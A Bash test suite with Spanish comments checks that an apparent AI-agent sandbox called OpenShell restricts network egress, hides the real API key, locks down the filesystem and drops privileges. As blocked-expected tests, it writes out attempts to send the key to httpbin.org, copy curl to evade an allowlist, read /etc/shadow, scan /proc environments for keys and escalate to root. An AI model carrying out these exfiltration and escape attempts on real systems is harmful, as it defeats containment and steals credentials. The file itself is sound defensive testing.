#!/bin/bash
# Batería de pruebas que corre DENTRO del sandbox de OpenShell.
# Cada prueba dice qué esperamos: "permitido" o "bloqueado". PASS = OpenShell hizo lo esperado.
# Variables que inyecta el host: API, KEY_SHA (sha256 de la key real, nunca la key), NVIDIA_API_KEY (placeholder).

pass=0; fail=0; info=0
# Si algo mata este script a la mitad, al menos imprime el conteo parcial.
trap 'printf "\n(terminó) PASS=%d FAIL=%d INFO=%d\n" "$pass" "$fail" "$info"' EXIT
G=$'\e[32m'; Rr=$'\e[31m'; Y=$'\e[33m'; B=$'\e[1m'; N=$'\e[0m'

seccion() { printf '\n%s%s%s\n' "$B" "$1" "$N"; }

# prueba <nombre> <permitido|bloqueado> <comando...>
prueba() {
  local name="$1" exp="$2" out got rc; shift 2
  # stdin vacío + timeout: nada puede quedarse esperando (p. ej. su pidiendo contraseña)
  if declare -F "$1" >/dev/null; then out=$("$@" 2>&1 </dev/null); rc=$?
  else out=$(timeout 40 "$@" 2>&1 </dev/null); rc=$?; fi
  if [ "$rc" -eq 0 ]; then got=permitido; else got=bloqueado; fi
  [ "$rc" -eq 124 ] && out="(timeout) $out"
  [ "$rc" -gt 128 ] && [ "$rc" -ne 124 ] && out="(terminado por señal $((rc-128))) $out"
  if [ "$got" = "$exp" ]; then
    pass=$((pass+1)); printf '  %sPASS%s %-58s %s\n' "$G" "$N" "$name" "($got)"
  else
    fail=$((fail+1)); printf '  %sFAIL%s %-58s esperado=%s obtenido=%s\n' "$Rr" "$N" "$name" "$exp" "$got"
    printf '       %s\n' "$(printf '%s' "$out" | head -c 220 | tr '\n' ' ')"
  fi
}

# nota <nombre> <comando...>: no califica, solo reporta lo que pasa
nota() {
  local name="$1" out; shift
  if out=$(timeout 40 "$@" 2>&1 </dev/null); then r="funciona"; else r="falla"; fi
  info=$((info+1)); printf '  %sINFO%s %-58s %s: %s\n' "$Y" "$N" "$name" "$r" "$(printf '%s' "$out" | head -c 90 | tr '\n' ' ')"
}

C="curl -sS -f -m 20 -o /dev/null"
AUTH="Authorization: Bearer $NVIDIA_API_KEY"

seccion "1. Red: solo integrate.api.nvidia.com, solo con binarios autorizados"
prueba "curl -> NVIDIA /models (lo autoriza el perfil)"            permitido $C -H "$AUTH" "$API/models"
prueba "python3 -> NVIDIA /models (binario autorizado)"            permitido python3 -c 'import os,urllib.request as u
u.urlopen(u.Request(os.environ["API"]+"/models",headers={"Authorization":"Bearer "+os.environ["NVIDIA_API_KEY"]}),timeout=30).read(1)'
prueba "curl -> example.com (host no autorizado)"                  bloqueado $C https://example.com
prueba "curl -> pypi.org (registro de paquetes)"                   bloqueado $C https://pypi.org/simple/
prueba "curl -> github.com"                                        bloqueado $C https://github.com
prueba "python3 -> example.com"                                    bloqueado python3 -c 'import urllib.request as u; u.urlopen("https://example.com",timeout=15)'
prueba "curl -> NVIDIA por HTTP plano (puerto 80)"                 bloqueado $C http://integrate.api.nvidia.com/v1/models
prueba "curl -> IP directa 1.1.1.1"                                bloqueado $C https://1.1.1.1
prueba "curl --noproxy '*' -> example.com"                          bloqueado $C --noproxy '*' https://example.com
# No hay proxy explícito que saltarse: OpenShell intercepta todo. Si esta petición NO pasara por OpenShell,
# NVIDIA recibiría el placeholder como key y respondería 401. Que funcione prueba que sí pasó por el proxy.
prueba "curl --noproxy '*' -> NVIDIA: igual pasa por OpenShell"     permitido $C --noproxy '*' -H "$AUTH" "$API/models"
prueba "socket TCP crudo a 1.1.1.1:443 (python)"                   bloqueado python3 -c 'import socket; socket.create_connection(("1.1.1.1",443),timeout=8)'
prueba "UDP a 8.8.8.8:53 (DNS directo)"                            bloqueado python3 -c 'import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(5)
s.sendto(bytes.fromhex("abcd01000001000000000000076578616d706c6503636f6d0000010001"),("8.8.8.8",53)); s.recv(512)'
prueba "curl copiado a /tmp -> NVIDIA (binario no autorizado)"     bloqueado sh -c 'cp /usr/bin/curl /tmp/micurl && /tmp/micurl -sS -f -m 20 -o /dev/null -H "Authorization: Bearer $NVIDIA_API_KEY" "$API/models"'
prueba "git -> NVIDIA (binario no autorizado)"                     bloqueado git ls-remote "$API/x"
nota   "DNS de example.com (198.18.x = IP sintética interceptada)"           python3 -c 'import socket; print(socket.getaddrinfo("example.com",443)[0][4][0])'
nota   "variables de proxy que ve el workload"                     sh -c 'env | grep -i _proxy | sed -E "s#//[^@]*@#//***@#" | tr "\n" " "; true'

seccion "2. Credenciales: el agente nunca ve la key real"
nota   "valor de NVIDIA_API_KEY dentro del sandbox (recortado)"    sh -c 'printf "%.18s… (%s chars)" "$NVIDIA_API_KEY" "${#NVIDIA_API_KEY}"'
prueba "NVIDIA_API_KEY NO es la key real"                          permitido sh -c '[ "$(printf %s "$NVIDIA_API_KEY" | sha256sum | cut -d" " -f1)" != "$KEY_SHA" ]'
prueba "mandar la key a otro host (httpbin.org)"                   bloqueado $C -H "$AUTH" https://httpbin.org/anything
prueba "mandar la key en la URL a otro host"                       bloqueado $C "https://httpbin.org/get?k=$NVIDIA_API_KEY"
buscar_key_real() {
  # Junta todo lo que parezca una key nvapi- en entornos de procesos y archivos legibles
  # y compara su hash con el de la key real. Encontrarla = fuga.
  local f tok
  for f in /proc/[0-9]*/environ /proc/[0-9]*/cmdline; do
    tr '\0' '\n' < "$f" 2>/dev/null
  done | grep -oE 'nvapi-[A-Za-z0-9_-]{20,}' > /tmp/toks 2>/dev/null
  grep -rhoE 'nvapi-[A-Za-z0-9_-]{20,}' /etc /tmp /workspace /usr/local/share 2>/dev/null >> /tmp/toks
  while read -r tok; do
    [ "$(printf %s "$tok" | sha256sum | cut -d" " -f1)" = "$KEY_SHA" ] && { echo "KEY REAL ENCONTRADA"; return 0; }
  done < /tmp/toks
  return 1
}
prueba "buscar la key real en /proc/*/environ y archivos"          bloqueado buscar_key_real

seccion "3. Sistema de archivos (Landlock)"
prueba "escribir en /tmp"                                          permitido sh -c 'echo x > /tmp/prueba-escritura'
prueba "escribir en /etc"                                          bloqueado sh -c 'echo x > /etc/prueba'
prueba "escribir en /usr/local/bin (troyanizar binarios)"          bloqueado sh -c 'echo x > /usr/local/bin/prueba'
prueba "modificar /usr/bin/curl"                                   bloqueado sh -c 'echo x >> /usr/bin/curl'
prueba "leer /root"                                                bloqueado ls /root
prueba "leer /opt"                                                 bloqueado ls /opt
prueba "leer /var/lib (fuera de lo permitido)"                     bloqueado ls /var/lib
prueba "ver el socket de Docker"                                   bloqueado test -e /var/run/docker.sock
prueba "ver archivos de tu Mac (/Users)"                           bloqueado ls /Users
prueba "leer /etc/shadow"                                          bloqueado cat /etc/shadow

seccion "4. Procesos y privilegios (seccomp, sin capabilities)"
prueba "no corre como root"                                        permitido sh -c '[ "$(id -u)" != 0 ]'
prueba "capabilities efectivas en cero"                            permitido grep -qE '^CapEff:[[:space:]]*0+$' /proc/self/status
prueba "NoNewPrivs activo (setuid no sirve)"                       permitido grep -qE '^NoNewPrivs:[[:space:]]*1' /proc/self/status
prueba "seccomp activo"                                            permitido grep -qE '^Seccomp:[[:space:]]*2' /proc/self/status
prueba "crear user namespace (unshare -r)"                         bloqueado unshare -r true
prueba "montar un tmpfs"                                           bloqueado sh -c 'mkdir -p /tmp/m && mount -t tmpfs none /tmp/m'
prueba "chroot"                                                    bloqueado chroot / true
nota   "identidad del proceso"                                     id
nota   "binarios setuid visibles"                                  sh -c 'find /usr/bin /bin -perm -4000 2>/dev/null | tr "\n" " "'
prueba "su a root (setuid; va al final por si cuelga)"             bloqueado su -c true root

trap - EXIT
printf '\n%sResultado:%s %s%d PASS%s, %s%d FAIL%s, %d INFO\n' "$B" "$N" "$G" "$pass" "$N" "$Rr" "$fail" "$N" "$info"
[ "$fail" -eq 0 ]
